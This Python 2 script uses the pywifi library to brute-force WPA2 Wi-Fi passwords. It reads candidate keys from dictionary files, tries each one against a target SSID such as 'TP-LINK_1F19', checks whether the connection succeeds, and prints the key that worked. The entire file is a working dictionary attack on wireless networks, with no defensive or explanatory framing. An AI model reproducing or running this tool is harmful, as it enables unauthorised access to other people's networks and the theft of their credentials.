import os
import sys
import time
import multiprocessing
import threading
import pywifi

this_file_path = os.path.dirname(os.path.abspath(__file__))
sys.path.append(this_file_path + '/../lib/')
from MultiThread import MultiThread

# ---------------- get a net card ----------------
def get_net_card():
    wifi = pywifi.PyWiFi()
    if (not wifi) or len(wifi.interfaces()) == 0:
        print "[ERROR] get net card failed."
        return None

    iface = wifi.interfaces()[0]
    print "[NOTICE] get net card success. card_name=%s" % (iface.name())

    return iface

# ----------------- wifi searching ---------------
def scan_wifi(iface, timeout=3):
    iface.scan()
    time.sleep(timeout)
    res = iface.scan_results()
    if len(res) <= 0:
        print "[WARNING] get wifi points failed."
    else:
        print "[NOTICE] get wifi points success. num=%s" % (len(res))
        for point in res:
            print point.signal, point.ssid

    return res

# ----------------- test connect -----------------
def connect_wifi(iface, ssid, key, timeout=3):
    print "[NOTICE] analysis wifi:%s passwd:%s" % (ssid, key)

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = key

    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    
    iface.connect(profile)
    time.sleep(1)
    status = pywifi.const.IFACE_CONNECTING
    while timeout > 0:
        status = iface.status()
        if status == pywifi.const.IFACE_CONNECTED:
            print "[SUCCESS] wifi:%s passwd:%s time:%d" % (ssid, key, timeout)
            iface.disconnect()
            return (ssid, key)
        
        if status == pywifi.const.IFACE_DISCONNECTED:
            #print "[FAIL] wifi:%s passwd:%s time:%d" % (ssid, key, timeout)
            break
        
        #print "[NOTICE] connect... status=", iface.status()
        time.sleep(1)
        timeout -= 1

    iface.disconnect()
    return None

# ------------------- process --------------------
def analysis_wifi(params):
    res = connect_wifi(params["iface"], params["ssid"], params["key"], params["timeout"])
    return res

def multi_analysis_wifi(iface, ssid, passwd_dict_path, multi_num, timeout):
    fd = open(passwd_dict_path, "r")
    batch_num = 0
    param_buf = []
    thread_buf = []
    for line in fd:
        param = {
            "iface": iface,
            "ssid": ssid,
            "key": line.strip(),
            "timeout": timeout
        }
        t = MultiThread(analysis_wifi, param)
        param_buf.append(param)
        thread_buf.append(t)
        batch_num += 1

        if batch_num >= multi_num:
            MultiThread.process(thread_buf)
            for i in range(len(thread_buf)):
                th = thread_buf[i]
                if not th.result is None:
                    print "[SUCCESS] wifi:%s passwd:%s" % (param_buf[i]["ssid"], param_buf[i]["key"])
                    return th.result
                else:
                    print "[FAIL] wifi:%s passwd:%s" % (param_buf[i]["ssid"], param_buf[i]["key"])
                del th
            batch_num = 0
            param_buf = []
            thread_buf = []
    if batch_num > 0:
        MultiThread.process(thread_buf)
        for i in range(len(thread_buf)):
            th = thread_buf[i]
            if not th.result is None:
                print "[SUCCESS] wifi:%s passwd:%s" % (param_buf[i]["ssid"], param_buf[i]["key"])
                return th.result
            else:
                print "[FAIL] wifi:%s passwd:%s" % (param_buf[i]["ssid"], param_buf[i]["key"])
            del th
        batch_num = 0
        param_buf = []
        thread_buf = []

    return None


if __name__ == '__main__':
    print "[NOTICE] start to get a net card..."
    iface = get_net_card()

    print "start to search wifi point..."
    #wifi_list = scan_wifi(iface)

    print "start to analysis wifi passwd..."
    #res = connect_wifi(iface, "mhxzkhl", "11111111", 10)
    #print res

    print "start to multi analysis wifi passwd..."
    #res = multi_analysis_wifi(iface, "mhxzkhl", "../dict/easy.txt", multi_num=1, timeout=1)
    res = multi_analysis_wifi(iface, "TP-LINK_1F19", "../dict/full_name.txt", multi_num=1, timeout=1)
    print res
    exit(0)
